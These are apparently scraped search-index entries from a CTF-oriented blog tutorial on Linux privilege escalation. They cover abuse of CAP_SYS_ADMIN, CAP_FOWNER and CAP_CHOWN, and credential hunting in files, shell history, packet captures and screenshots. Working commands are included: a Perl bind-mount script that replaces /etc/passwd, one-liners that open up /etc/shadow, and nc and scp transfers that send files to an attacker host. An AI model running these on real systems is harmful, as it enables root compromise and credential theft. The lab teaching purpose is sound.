/etc/shadow -rw-r----- 1 root shadow 1610 oct 25 25:45 /etc/shadow user@pwn:~$ groups shadow adm cdrom sudo dip plugdev lpadmin lxd sambashare user user@pwn:~$ id uid=1000(user) gid=42(shadow) grupos=42(shadow) user@pwn:~$ cat /etc/shadow root:$6$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.:18918:0:99999:7::: \u003c...SNIP...\u003e Privilege Escalation via CAP_SYS_ADMIN The CAP_SYS_ADMIN capability is one of the most powerful and broad capabilities in the Linux system. It grants a wide range of administrative privileges that are not covered by other specific capabilities. Here are some of the key functions and permissions associated with CAP_SYS_ADMIN: Mounting and Unmounting Filesystems: Allows mounting and unmounting of filesystems. Setting Disk Quotas: Enables setting disk quotas for users. Modifying Kernel Parameters: Permits modification of certain kernel parameters. Performing System Reboots: Allows the system to be rebooted. Bypassing File Read, Write, and Execute Permissions: Grants the ability to bypass file permissions in certain contexts. Managing Namespaces: Allows creation and management of namespaces. Accessing Raw Sockets: Permits access to raw sockets, which can be used for network packet manipulation. Due to its extensive range of permissions, CAP_SYS_ADMIN is often considered a “catch-all” capability, and it is crucial to use it with caution. Misuse or overuse of this capability can lead to significant security risks. ","date":"2021-12-28","objectID":"/linux-privesc-capabilities/:9:0","tags":["capabilities","cap_setuid","cap_setgid","cap_sys_admin","cap_chown","cap_fowner"],"title":"Linux Privilege Escalation - Capabilities  for CTF Creators","uri":"/linux-privesc-capabilities/"},{"categories":["Linux Privilege Escalation"],"content":"Mounting File System Example This means that we can mount/umount filesystems. user@pwn:~$ cp $(which perl) . user@pwn:~$ ls perl perl user@pwn:~$ sudo /usr/sbin/setcap cap_sys_admin+ep ./perl user@pwn:~$ getcap -r ./perl ./perl = cap_sys_admin+ep Using Python we can mount a modified passwd file on top of the real passwd file: user@pwn:~$ cp /etc/passwd ./ user@pwn:~$ openssl passwd -1 -salt abc password $1$xxxxxxxxxxxxxxxxx/ user@pwn:~$ vim ./passwd user@pwn:~$ head -n 1 ./passwd root:$1$xxxxxxxxxxxxxxxxxxx/:0:0:root:/root:/bin/bash Install the required modules: cpan Sys::Syscall Replace the /etc/passwd file by creating the following Perl script: #!/usr/bin/perl use strict; use warnings; # Change the source path my $source = \"/home/user/passwd\"; my $target = \"/etc/passwd\"; # File System and Options my $filesystemtype = \"none\"; my $options = \"rw\"; my $mountflags = 4096; # MS_BIND # Determine the system call number for mount my $syscall_number = determine_syscall_number(\"mount\"); # Invoke the system call directly my $ret = syscall($syscall_number, $source, $target, $filesystemtype, $mountflags, $options); if ($ret == -1) { die \"Error mounting: $!\"; } print \"Mount successful.\\n\"; # Helper function to determine the system call number sub determine_syscall_number { my ($syscall_name) = @_; my $syscall_number = eval { require 'syscall.ph'; eval \"\u0026SYS_$syscall_name\"; }; die \"Unable to determine the system call number for $syscall_name: $@\" if $@; die \"Unable to determine the system call number for $syscall_name\" unless defined $syscall_number; return $syscall_number; } In the above Perl code, we define a Perl subroutine named $mount that wraps the libc.mount function. After that, we define the necessary variables ($source, $target, $filesystemtype, $options, and $mountflags) with the corresponding values. The code also includes a helper function, determine_syscall_number, which attempts to determine the system call number for a given syscall name (mount in this case). It uses the syscall.ph file, which should be present on your system, to determine the number. The code then invokes the system call using the determined number. Please note that the determination of the system call number relies on the presence of the syscall.ph file and the correct mapping of the syscall names. In some cases, additional steps may be required to ensure that the syscall.ph file is available and up to date. We could then mount the modified passwd file on /etc/passwd: user@pwn:~$ ./perl cap_sys_admin.pl user@pwn:~$ cat /etc/passwd root:$1$xxxxxxxxxxxxxxxxxxxx/:0:0:root:/root:/bin/bash Then we can switch to the root user with the password provided: user@pwn:~$ su root Password: root@pwn:/home/user# id uid=0(root) gid=0(root) grupos=0(root) Privilege Escalation via CAP_FOWNER The CAP_FOWNER capability in Linux allows a process to bypass file ownership checks. This means that a process with this capability can perform operations on files as if it were the owner of those files. Here are some key points about CAP_FOWNER: Bypass Ownership Checks: It allows processes to ignore the ownership of files when performing operations such as reading, writing, or executing. Modify File Attributes: Processes can change file attributes, such as permissions, without being the file owner. Override Restrictions: It can override certain restrictions that are normally enforced based on file ownership, providing greater flexibility in managing files. This capability is particularly useful for system administrators and certain system processes that need to manage files across different users without being restricted by file ownership. However, it should be used with caution, as it can pose security risks if misused. ","date":"2021-12-28","objectID":"/linux-privesc-capabilities/:10:0","tags":["capabilities","cap_setuid","cap_setgid","cap_sys_admin","cap_chown","cap_fowner"],"title":"Linux Privilege Escalation - Capabilities  for CTF Creators","uri":"/linux-privesc-capabilities/"},{"categories":["Linux Privilege Escalation"],"content":"Perl Example Copy the Perl binary to the current folder: cp $(which perl) . The capability CAP_FOWNER allows us to change the permission of a file. user@pwn:~$ sudo /usr/sbin/setcap cap_fowner+ep ./perl user@pwn:~$ getcap -r ./perl ./perl = cap_fowner+ep The original /etc/shadow permissions are the following: user@pwn:~$ ls -la /etc/shadow -rw-r----- 1 root shadow 1610 oct 25 15:44 /etc/shadow If Python has this capability we can modify the permissions of the shadow file, then change the root password, and as a result, elevate privileges: ./perl -e 'chmod 0666, \"/etc/shadow\"' Change the root password: user@pwn:~$ ls -la /etc/shadow -rw-rw-rw- 1 root shadow 1610 oct 25 15:44 /etc/shadow user@pwn:~$ vim /etc/shadow user@pwn:~$ cat /etc/passwd | grep ^root root::0:0:root:/root:/bin/bash # Doesn't matter if it has the x user@pwn:~$ cat /etc/shadow | grep ^root root::18918:0:99999:7::: Elavate to the root user: user@pwn:~$ vim /etc/passwd user@pwn:~$ su root root@pwn:/home/user# exit exit user@pwn:~$ cat /etc/passwd | grep ^root root:x:0:0:root:/root:/bin/bash # With the x user@pwn:~$ ","date":"2021-12-28","objectID":"/linux-privesc-capabilities/:11:0","tags":["capabilities","cap_setuid","cap_setgid","cap_sys_admin","cap_chown","cap_fowner"],"title":"Linux Privilege Escalation - Capabilities  for CTF Creators","uri":"/linux-privesc-capabilities/"},{"categories":["Linux Privilege Escalation"],"content":"Python Example The capability CAP_FOWNER allows us to change the permission of a file. user@pwn:~$ sudo /usr/sbin/setcap cap_fowner+ep ./python3 user@pwn:~$ getcap -r ./python3 ./python3 = cap_fowner+ep The original /etc/shadow permissions are the following: user@pwn:~$ ls -la /etc/shadow -rw-r----- 1 root shadow 1610 oct 25 15:44 /etc/shadow If Python has this capability we can modify the permissions of the shadow file, then change the root password, and as a result, elevate privileges: ./python3 -c 'import os;os.chmod(\"/etc/shadow\",0o666)' Change the root password: user@pwn:~$ ls -la /etc/shadow -rw-rw-rw- 1 root shadow 1610 oct 25 15:44 /etc/shadow user@pwn:~$ vim /etc/shadow user@pwn:~$ cat /etc/passwd | grep ^root root::0:0:root:/root:/bin/bash # Doesn't matter if it has the x user@pwn:~$ cat /etc/shadow | grep ^root root::18918:0:99999:7::: Elevate to the root user: user@pwn:~$ vim /etc/passwd user@pwn:~$ su root root@pwn:/home/user# exit exit user@pwn:~$ cat /etc/passwd | grep ^root root:x:0:0:root:/root:/bin/bash # With the x user@pwn:~$ Privilege Escalation via CAP_CHOWN The capability CAP_CHOWN allows us to change the ownership of any file. user@pwn:~$ sudo /usr/sbin/setcap cap_chown+ep ./python3 user@pwn:~$ getcap -r ./python3 ./python3 = cap_chown+ep Let’s suppose the Python binary has this capability, we can change the owner of the shadow file, change the root password, and escalate privileges: user@pwn:~$ cat /etc/passwd | grep ^user user:x:1000:1000:user,,,:/home/user:/bin/bash ./python3 -c 'import os;os.chown(\"/etc/shadow\",1000,1000)' Now we can read the /etc/shadow file: user@pwn:~$ ./python3 -c 'import os;os.chown(\"/etc/shadow\",1000,1000)' user@pwn:~$ ls -la /etc/shadow -rw-r----- 1 user user 1610 oct 25 12:40 /etc/shadow user@pwn:~$ cat /etc/shadow root:$6$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.:18918:0:99999:7::: daemon:*:18667:0:99999:7::: Defense Defending against capabilities can be challenging. Here are some key points to consider: Avoid using unnecessary capabilities: Only enable capabilities that are essential for the task at hand. Ensure capabilities cannot be exploited: Regularly review and audit capabilities to prevent potential abuse. ","date":"2021-12-28","objectID":"/linux-privesc-capabilities/:12:0","tags":["capabilities","cap_setuid","cap_setgid","cap_sys_admin","cap_chown","cap_fowner"],"title":"Linux Privilege Escalation - Capabilities  for CTF Creators","uri":"/linux-privesc-capabilities/"},{"categories":["Linux Privilege Escalation"],"content":"Credential Hunting Credential hunting is the practice of finding credentials in a system. These can either be encrypted, encoded, or in plain text. Some programs may store credentials in an encrypted format while others do not. Privilege Escalation via Sensitive Files In Linux, many files may contain passwords: $ locate password | less /boot/grub/i386-pc/legacy_password_test.mod \u003cSNIP\u003e ","date":"2021-12-28","objectID":"/linux-privesc-credential-hunting/:0:0","tags":["credential hunting","plaintext","cleartext","smtp","postfix","opasswd","mysql","configuration files","pcapng","john","history","sshpass","telnet","netcat","swaks","scp"],"title":"Linux Privilege Escalation - Credential Hunting  for CTF Creators","uri":"/linux-privesc-credential-hunting/"},{"categories":["Linux Privilege Escalation"],"content":"Password Filename Scenario Startup by installing locate: sudo apt install mlocate From the adversary’s perspective, we can try to locate all the files that have in their name password as part of the filename: $ locate password | less /boot/grub/i386-pc/legacy_password_test.mod \u003cSNIP\u003e Now we could attempt to list the permissions of each of these files with: user@pwn:~$ locate password | xargs ls -l \u003cSNIP\u003e -rw-rw-r-- 1 user user 47 Jan 5 17:00 /home/user/Desktop/password.txt Alternatively, we could just use the find command: find / -iname \"*password*\" -exec ls -l {} \\; 2\u003e/dev/null We could filter the output more by using the -readable option to find readable files by our current user. find / -iname \"*password*\" -readable -exec ls -l {} \\; 2\u003e/dev/null There are some directories in which I’m not interested so we can also filter directories that we’re not interested in: user@pwn:~$ find / -iname \"*password*\" -readable -exec ls -l {} \\; 2\u003e/dev/null | grep -Ev 'snap|boot|/share|/lib' -rw-rw-r-- 1 user user 47 Jan 5 17:00 /home/user/Desktop/password.txt \u003cSNIP\u003e The first line from the output above is the only one that seems interesting to us: user@pwn:~$ cat /home/user/Desktop/password.txt Passwords: The user password is: pass321 Now, in a real-world machine (not common) or a CTF machine, we might find an interesting configuration file or a custom file that is not ordinary and might contain credentials. Privilege Escalation via Old Passwords The /etc/security/opasswd file is used also by pam_cracklib to keep the history of old passwords so that the user will not reuse them. This file contains user password hashes. I’m going to install the libraries first: user@pwn:~$ sudo apt-cache search pam_cracklib [sudo] password for user: libpam-cracklib - PAM module to enable cracklib support libpam-pwquality - PAM module to check password strength user@pwn:~$ sudo apt install libpam-cracklib libpam-pwquality Now let’s check if the shared objects files were created: user@pwn:~$ find / -name 'pam_cracklib.so' 2\u003e/dev/null /usr/lib/x86_64-linux-gnu/security/pam_cracklib.so user@pwn:~$ find / -name 'pam_unix.so' 2\u003e/dev/null | grep -v snap /usr/lib/x86_64-linux-gnu/security/pam_unix.so The opasswd shall be treated as the /etc/shadow file because it will contain user password hashes, therefore the configuration is the following by default: user@pwn:~$ ls -l /etc/security/opasswd -rw------- 1 root root 0 Aug 19 06:29 /etc/security/opasswd Once we’ve got the opasswd file set up, we can enable password history checking by adding the option \"remember=\u003cx\u003e\" to the pam_unix configuration line in the /etc/pam.d/common-password file. This enables the pam_cracklib module: user@pwn:~$ cat /etc/pam.d/common-password \u003cSNIP\u003e password required pam_cracklib.so retry=3 minlen=12 difok=4 password required pam_unix.so md5 remember=12 use_authtok Note: Noticed how all the instructions before the last two lines are commented. I commented all of them to avoid conflict. Source: https://deer-run.com/users/hal/sysadmin/pam_cracklib.html The number of old passwords we want to preserve for a user is the value of the “remember” option. Because there is an internal limit of 400 prior passwords, all values greater than 400 are identical to 400. Before we complain about this limit, keep in mind that 400 previous passwords represent nearly 30 years of password history, even if your site requires users to change passwords every 30 days it will stay working for 30 years. Once we’ve enabled password history, the opasswd file starts filling up with user entries that look like this: user:1000:\u003cn\u003e:\u003chash1\u003e,\u003chash2\u003e,...,\u003chashn\u003e The first two fields are the username and user ID. The \u003cn\u003e in the third field represents the number of old passwords currently being stored for the user–this value is incremented by one every time a new hash is added to the user’s password history until \u003cn\u003e ultimately equals the value of the “remember” parameter set on the pam_unix configuration line. The \u003chash1\u003e,\u003chash","date":"2021-12-28","objectID":"/linux-privesc-credential-hunting/:0:1","tags":["credential hunting","plaintext","cleartext","smtp","postfix","opasswd","mysql","configuration files","pcapng","john","history","sshpass","telnet","netcat","swaks","scp"],"title":"Linux Privilege Escalation - Credential Hunting  for CTF Creators","uri":"/linux-privesc-credential-hunting/"},{"categories":["Linux Privilege Escalation"],"content":"Plain Text File Scenario We will simply save a password into a text file: echo -e 'Passwords:\\n\\tRoot user password is: pass123\\n' \u003e /home/user/Desktop/password.txt This is how the output of the file password.txt looks: user@pwn:~$ cat /home/user/Desktop/password.txt Passwords: Root user password is: pass123 Now let’s change to the adversary’s perspective, startup by searching for the string password on all the system files: user@pwn:~$ find . -type f -exec grep -io -I \"password\" {} /dev/null \\; ./Desktop/password.txt:Password ./Desktop/password.txt:password \u003cSNIP\u003e Looking at the first two lines of the output above, we can see the file that we created earlier. The next step would be to check if we have read permissions on this file: user@pwn:~$ ls -l ./Desktop/password.txt -rw-rw-r-- 1 user user 44 Jan 5 16:23 ./Desktop/password.txt Viewing the output above, we can see that we have read permissions, now we can read the file and see if it contains passwords: user@pwn:~$ cat ./Desktop/password.txt Passwords: Root user password is: pass123 user@pwn:~$ It seems that the root password is pass123, let’s try to switch to the root user and log in with this password: user@pwn:~$ su root Password: root@pwn:/home/user# whoami root root@pwn:/home/user# id uid=0(root) gid=0(root) groups=0(root) root@pwn:/home/user# As we can see, we were able to escalate privileges by simply finding a password string in a file called password.txt which is stored on the user’s desktop. This is a common misconfiguration that client users might do on their workstations. As system administrators, we shall know that this is very uncommon or at least it should be avoided. Privilege Escalation via Network Packets Let’s not forget one of the most basic things when it comes to information security and that is protocols that are not encrypted. Yes, we may be able to capture some traffic of a protocol like FTP, HTTP or Telnet, someone logins and we capture those credentials. Sometimes system administrators that are monitoring the network may forget that they have stored some of these captures in PCAP files. If an adversary manages to compromise the system and read one of these captures he/she may find some valid credentials. ","date":"2021-12-28","objectID":"/linux-privesc-credential-hunting/:0:2","tags":["credential hunting","plaintext","cleartext","smtp","postfix","opasswd","mysql","configuration files","pcapng","john","history","sshpass","telnet","netcat","swaks","scp"],"title":"Linux Privilege Escalation - Credential Hunting  for CTF Creators","uri":"/linux-privesc-credential-hunting/"},{"categories":["Linux Privilege Escalation"],"content":"Wireshark Capture Scenario (FTP) Startup by installing an FTP service and a Network Sniffer in this case Wireshark: sudo apt update \u0026\u0026 sudo apt install -y vsftpd wireshark Now let’s configure the FTP service: sudo vim /etc/vsftpd Now add or uncomment the following lines (if already added in the file): listen=NO anonymous_enable=NO local_enable=YES write_enable=YES local_umask=022 dirmessage_enable=YES use_localtime=YES xferlog_enable=YES connect_from_port_20=YES chroot_local_user=YES secure_chroot_dir=/var/run/vsftpd/empty pam_service_name=vsftpd #rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem #rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key ssl_enable=No pasv_enable=Yes pasv_min_port=10000 pasv_max_port=10100 allow_writeable_chroot=YES ssl_tlsv1=NO ssl_sslv2=NO ssl_sslv3=NO Once done, save and close the /etc/vsftpd.conf file. Run the service and check its status: sudo systemctl enable vsftpd.service \u0026\u0026 sudo systemctl restart vsftpd.service \u0026\u0026 sudo systemctl status vsftpd.service Now run wireshark in the localhost interface card: sudo wireshark Select the loopback interface: Wireshark Loopback\rTest FTP connection locally: user@pwn:~$ ftp localhost Connected to localhost. 220 (vsFTPd 3.0.3) Name (localhost:user): user 331 Please specify the password. Password: # pass321 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e Capture the FTP packets in the loopback interface and follow the TCP stream and save the capture. Then change the ownership of the file to our user and group: user@pwn:~$ sudo chown user:user /home/user/Desktop/ftp-creds.pcapng Now from the adversary’s perspective, we can enumerate pcap files: user@pwn:~$ find / -name '*.pcap*' 2\u003e/dev/null | grep -v snap /home/user/Desktop/ftp-creds.pcapng /usr/share/mime/application/vnd.tcpdump.pcap.xml We found the file /home/user/Desktop/ftp-creds.pcapng let’s attempt to transfer this file to our adversary host. The last time we did a file transfer we used scp, this time around I’m going to use nc just to keep things different: user@pwn:~$ which nc /usr/bin/nc Set up a listener on your adversary host: ❯ nc -l -p 1234 \u003e ftp-creds.pcapng Send the pcapng file to the adversary host: sudo nc -w 3 10.10.10.15 1234 \u003c /home/user/Desktop/ftp-creds.pcapng Verify the checksum on the victim/target host/machine: user@pwn:~$ md5sum /home/user/Desktop/ftp-creds.pcapng xxxxxxxxxxxxxxxx /home/user/Desktop/ftp-creds.pcapng Verify the checksum on our adversary host/machine: ❯ md5sum ftp-creds.pcapng xxxxxxxxxxxxxxxx ftp-creds.pcapng The hashes are the same which means that the integrity of the file is the same which means that they are the same files. Now let’s open wireshark in our adversary host/machine: Open Wireshark Capture\rFollow the TCP stream of the capture to find the credentials. Privilege Escalation via Images Screenshots or pictures/photos of credentials is very a common mistake that could happen anywhere. ","date":"2021-12-28","objectID":"/linux-privesc-credential-hunting/:0:3","tags":["credential hunting","plaintext","cleartext","smtp","postfix","opasswd","mysql","configuration files","pcapng","john","history","sshpass","telnet","netcat","swaks","scp"],"title":"Linux Privilege Escalation - Credential Hunting  for CTF Creators","uri":"/linux-privesc-credential-hunting/"},{"categories":["Linux Privilege Escalation"],"content":"Screenshot Scenario To demonstrate this example, I’m going to use flameshot to take a screenshot. we can use any screenshot tool. sudo apt update \u0026\u0026 sudo apt install flameshot Then I’m going to execute flameshot: Flameshot Icon\rNow I’m going to take a screenshot: Flameshot Take Screenshot\rSelect the area that we want to screenshot. Use any text editor of your choosing. Flameshot Screenshot Password\rSave it to the Pictures directory: Password\rFrom the adversary’s perspective we can see this image stored in the /home/user/Pictures directory: user@pwn:~$ ls -l Pictures/ total 8 -rw-rw-r-- 1 user user 7955 Jan 5 20:43 password.png As we can see from the above this looks very interesting, as an adversary we could try to transfer this image to our adversary host. There are many ways in which we could transfer files. I’m just going to keep it simple by using scp. Let’s check if scp is installed in the target/victim machine: user@pwn:~$ which scp /usr/bin/scp user@pwn:~$ Now we’re going to use the adversary host/machine and view our IP address: ❯ ip -color=auto --brief address show lo UNKNOWN 127.0.0.1/8 ::1/128 eth0 UP 10.10.10.15/24 fe80::20c:29ff:fec5:fd0/64 Lastly, let’s start the SSH service in our adversary host: ❯ sudo systemctl start ssh \u0026\u0026 sudo systemctl status ssh | grep active Active: active (running) since Wed 2021-01-05 19:51:46 EST; 7min ago From the victim machine/target let’s log in to our SSH service and transfer the file at the same time with scp: user@pwn:~$ scp /home/user/Pictures/password.png kali@10.10.10.15:/home/kali/Pictures The authenticity of host '10.10.10.15 (10.10.10.15)' can't be established. ECDSA key fingerprint is SHA256:+sekweCXMu7Qr1XeTiYW4Ucu6gvZVtcBJy7UtbzemsI. Are we sure we want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.10.15' (ECDSA) to the list of known hosts. kali@10.10.10.15's password: password.png 100% 7955 6.6MB/s 00:00 user@pwn:~$ Now in our adversary host/machine, let’s navigate to the /home/kali/Pictures directory: ❯ ls -l ~/Pictures | grep password .rw-r--r-- kali kali 7.8 KB Wed Jan 5 20:01:31 2021 password.png As we can see from the output above, the image has been transferred. Let’s open this image with an image viewer: ❯ which ristretto /usr/bin/ristretto ❯ ristretto /home/kali/Pictures/password.png The image has been opened and now we can see its contents: Image Password\rNow we know a potential password. We could try to use a password re-use technique or simply try to switch to the root user with this password that we found. Privilege Escalation via History Files We might see credentials in the console/shell history, sometimes some people do enter credentials to command parameters as arguments. This can be seen when someone wants to connect remotely to a database without interaction when using commands like sshpass or mysql: cat ~/.history history ","date":"2021-12-28","objectID":"/linux-privesc-credential-hunting/:0:4","tags":["credential hunting","plaintext","cleartext","smtp","postfix","opasswd","mysql","configuration files","pcapng","john","history","sshpass","telnet","netcat","swaks","scp"],"title":"Linux Privilege Escalation - Credential Hunting  for CTF Creators","uri":"/linux-privesc-credential-hunting/"},{"categories":["Linux Privilege Escalation"],"content":"sshpass Scenario Let’s install sshpass and the ssh-client: sudo apt install sshpass ssh Restart the ssh service and check its status: user@pwn:~$ sudo systemctl restart sshd.service \u0026\u0026 sudo systemctl status sshd.service ● ssh.service - OpenBSD Secure Shell server Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled) Active: active (running) since Wed 2021-01-05 20:25:36 AST; 11ms ago Docs: man:sshd(8) man:sshd_config(5) Process: 26904 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS) Main PID: 26905 (sshd) Tasks: 1 (limit: 4599) Memory: 1.0M CGroup: /system.slice/ssh.service └─26905 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups \u003cSNIP\u003e Now let’s authenticate to localhost using sshpass so we can avoid an interactive logon: user@pwn:~$ sshpass -p pass321 ssh -o StrictHostKeyChecking=no user@localhost Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.11.0-43-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 13 updates can be applied immediately. To see these additional updates run: apt list --upgradable Your Hardware Enablement Stack (HWE) is supported until April 2025. *** System restart required *** Last login: Tue Dec 20 21:27:18 2021 from 10.10.10.15 user@pwn:~$ Let’s exit out of the SSH shell: user@pwn:~$ exit logout Connection to localhost closed. user@pwn:~$ **** Now from the adversary’s perspective, we can attempt to read the history of the shell: cat ~/.bash_history; echo \"history command output:\"; history Let’s filter this output: user@pwn:~$ cat ~/.bash_history | grep sshpass sudo apt install sshpass sshpass -p pass321 ssh user@localhost sudo apt install sshpass ssh sshpass sshpass -p pass321 ssh user@localhost -p 22 user@pwn:~$ history | grep sshpass 643 sudo apt install sshpass 644 sshpass -p pass321 ssh user@localhost 646 sudo apt install sshpass ssh 648 sshpass 652 sshpass -p pass321 ssh user@localhost -p 22 655 sshpass -p exitu2tryhack ssh -o StrictHostKeyChecking=no user@localhost 656 sshpass -p pass321 ssh -o StrictHostKeyChecking=no user@localhost As we can see from the output above, we have found a potential password which is pass321. As an adversary, we could try to use this password with all the users that have bash/zsh/sh shell defined on the system. This can be found in the /etc/passwd file: user@pwn:~$ cat /etc/passwd | grep \"sh$\" root:x:0:0:root:/root:/bin/bash user:x:1000:1000:user,,,:/home/user:/bin/bash user:x:1001:1001:,,,:/home/user:/bin/bash test:x:1002:1002::/home/test:/bin/sh We could try to log in either with SSH, Telnet, FTP, NFS, or any other service or locally try the password we found which is pass321 on all these users. This technique is also known as password reuse. As system administrators, we shall never use the same password for other users or services. Here we can read a Red Hat Documentation on how we can use sshpass ","date":"2021-12-28","objectID":"/linux-privesc-credential-hunting/:0:5","tags":["credential hunting","plaintext","cleartext","smtp","postfix","opasswd","mysql","configuration files","pcapng","john","history","sshpass","telnet","netcat","swaks","scp"],"title":"Linux Privilege Escalation - Credential Hunting  for CTF Creators","uri":"/linux-privesc-credential-hunting/"},{"categories":["Linux Privilege Escalation"],"content":"Emails Sending credentials via email is a very common mistake that I have seen in the real world. Let’s try to find credentials in the emails of the system. ","date":"2021-12-28","objectID":"/linux-privesc-credential-hunting/:1:0","tags":["credential hunting","plaintext","cleartext","smtp","postfix","opasswd","mysql","configuration files","pcapng","john","history","sshpass","telnet","netcat","swaks","scp"],"title":"Linux Privilege Escalation - Credential Hunting  for CTF Creators","uri":"/linux-privesc-credential-hunting/"},{"categories":["Linux Privilege Escalation"],"content":"SMTP Postfix Scenario Let’s startup by setting up an SMTP server. Set a valid FQDN (Fully Qualified Domain Name) hostname for our Ubuntu system using the hostnamectl command as shown here: sudo hostnamectl set-hostname mail.user.com Now the hostname has changed: user@pwn:~$ hostname mail.user.com Postfix is a mail transfer agent (MTA) which is the responsible software for delivering \u0026 receiving emails, it’s essential to create a complete mail server. sudo apt update \u0026\u0026 sudo apt install postfix I’m going to set up an Internet Site although my VM is not on the Internet but rather in a virtualized LAN network. Once Postfix is installed, it will automatically start and creates a new /etc/postfix/main.cf file. we can verify the Postfix version and status of the service using the following commands. user@pwn:~$ postconf mail_version mail_version = 3.4.13 user@pwn:~$ sudo systemctl status postfix ● postfix.service - Postfix Mail Transport Agent Loaded: loaded (/lib/systemd/system/postfix.service; enabled; vendor preset: enabled) Active: active (exited) since Thu 2021-01-06 19:47:03 AST; 1min 10s ago Main PID: 6685 (code=exited, status=0/SUCCESS) Tasks: 0 (limit: 4599) Memory: 0B CGroup: /system.slice/postfix.service Jan 06 19:47:03 mail.user.com systemd[1]: Starting Postfix Mail Transport Agent... Jan 06 19:47:03 mail.user.com systemd[1]: Finished Postfix Mail Transport Agent. The mail configuration file looks like this: user@pwn:~$ sudo cat /etc/postfix/main.cf # See /usr/share/postfix/main.cf.dist for a commented, more complete version # Debian specific: Specifying a file name will cause the first # line of that file to be used as the name. The Debian default # is /etc/mailname. #myorigin = /etc/mailname smtpd_banner = $myhostname ESMTP $mail_name (Ubuntu) biff = no # appending .domain is the MUA's job. append_dot_mydomain = no # Uncomment the next line to generate \"delayed mail\" warnings #delay_warning_time = 4h readme_directory = no # See http://www.postfix.org/COMPATIBILITY_README.html -- default to 2 on # fresh installs. compatibility_level = 2 # TLS parameters smtpd_tls_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem smtpd_tls_key_file=/etc/ssl/private/ssl-cert-snakeoil.key smtpd_tls_security_level=may smtp_tls_CApath=/etc/ssl/certs smtp_tls_security_level=may smtp_tls_session_cache_database = btree:${data_directory}/smtp_scache smtpd_relay_restrictions = permit_mynetworks permit_sasl_authenticated defer_unauth_destination myhostname = mail.user.com alias_maps = hash:/etc/aliases alias_database = hash:/etc/aliases myorigin = /etc/mailname mydestination = $myhostname, mail.user.com, localhost.user.com, localhost relayhost = mynetworks = 127.0.0.0/8 [::ffff:127.0.0.0]/104 [::1]/128 mailbox_size_limit = 0 recipient_delimiter = + inet_interfaces = loopback-only default_transport = error relay_transport = error inet_protocols = all The inet_interfaces variable declares the interfaces in which the service will listen: inet_interfaces = loopback-only As we can see this is only listening on the loopback interface in IPv4 and IPv6 but we need to send emails from another host/machines/nodes so we need this service to be listening on the ethernet interface. This is what happens if we select loopback only option during the installation configuration. We can change this by adding our interfaces’ IP addresses: user@pwn:~$ ip --color=auto --brief addr lo UNKNOWN 127.0.0.1/8 ::1/128 ens33 UP 10.10.10.14/24 fe80::8450:b1b6:be0a:a735/64 Let’s modify the inet_interfaces variable and add the IP address of our ethernet interface: inet_interfaces = 10.10.10.14, 127.0.0.1 Restart the postfix service to apply the changes: user@pwn:~$ sudo systemctl restart postfix user@pwn:~$ sudo systemctl status postfix ● postfix.service - Postfix Mail Transport Agent Loaded: loaded (/lib/systemd/system/postfix.service; enabled; vendor preset: enabled) Active: active (exited) since Thu 2021-01-06 20:09:30 AST; 3s ago Process: 10037 ExecStart=/bin/true (code=exited, ","date":"2021-12-28","objectID":"/linux-privesc-credential-hunting/:1:1","tags":["credential hunting","plaintext","cleartext","smtp","postfix","opasswd","mysql","configuration files","pcapng","john","history","sshpass","telnet","netcat","swaks","scp"],"title":"Linux Privilege Escalation - Credential Hunting  for CTF Creators","uri":"/linux-privesc-credential-hunting/"},{"categories":["Linux Privilege Escalation"],"content":"MariaDB Scenario: For the sake of simplicity, I’m just gonna create a simple database with one table that contains credentials in plaintext. Install the MySQL client: sudo apt install -y mariadb-server mariadb-client Login to the MySQL service in localhost: user@pwn:~$ sudo mysql -h localhost -u root Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 54 Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. MariaDB [(none)]\u003e Let’s create a MariaDB user: MariaDB [mysql]\u003e USE mysql; Database changed MariaDB [mysql]\u003e CREATE USER 'user'@'localhost' IDENTIFIED BY 'pass321'; Query OK, 0 rows affected (0.001 sec) MariaDB [mysql]\u003e GRANT ALL PRIVILEGES ON *.* TO 'user'@'localhost'; Query OK, 0 rows affected (0.000 sec) MariaDB [mysql]\u003e UPDATE user SET plugin='unix_socket' WHERE User='user'; Query OK, 1 row affected (0.001 sec) Rows matched: 1 Changed: 1 Warnings: 0 MariaDB [mysql]\u003e FLUSH PRIVILEGES; Query OK, 0 rows affected (0.001 sec) MariaDB [mysql]\u003e exit; Bye Note: A of MySQL 8.0.4 the new default authentication plugin is ‘caching_sha2_password’ which we can log in from the Bash shell now with “mysql -u YOUR_SYSTEM_USER -p” and provide the password for this user on the prompt. There isn’t any need for the “UPDATE user SET plugin” step. Restart the MySQL service: sudo service mysql restart Show the databases: MariaDB [(none)]\u003e SHOW databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | +--------------------+ 3 rows in set (0.001 sec) Create a database called test: MariaDB [(none)]\u003e CREATE DATABASE test; Query OK, 1 row affected (0.003 sec) Use the SHOW statement to find out what databases currently exist on the server: MariaDB [(none)]\u003e SHOW DATABASES; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | test | +--------------------+ 4 rows in set (0.001 sec) Use the USE statement to use the database: MariaDB [(none)]\u003e USE test; Database changed MariaDB [test]\u003e Create a table with usernames and passwords: CREATE TABLE `users` ( `id` int NOT NULL AUTO_INCREMENT, `employee_id` int DEFAULT NULL, `user_type` varchar(50) DEFAULT NULL, `username` varchar(100) NOT NULL, `password` varchar(100) NOT NULL, PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8; The query looks like these in MariaDB: MariaDB [test]\u003e CREATE TABLE 